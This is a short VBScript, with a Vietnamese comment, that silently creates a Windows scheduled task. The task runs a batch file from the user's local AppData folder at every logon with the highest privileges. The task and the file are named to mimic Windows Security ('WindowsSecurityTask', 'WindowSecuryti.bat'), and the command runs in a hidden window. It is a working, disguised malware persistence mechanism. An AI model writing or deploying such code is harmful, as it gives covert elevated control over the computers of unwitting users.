Option Explicit

Dim shell, batPath, schtasksCommand

Set shell = CreateObject("WScript.Shell")

batPath = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\WindowSecuryti.bat"

schtasksCommand = "schtasks /create /tn ""WindowsSecurityTask"" /tr """ & batPath & """ /sc onlogon /rl highest /f"

' Chạy lệnh tạo task với quyền admin (bạn cần chạy onadmin.vbs bằng WScript hoặc CScript có quyền admin)
shell.Run "cmd /c " & schtasksCommand, 0, True
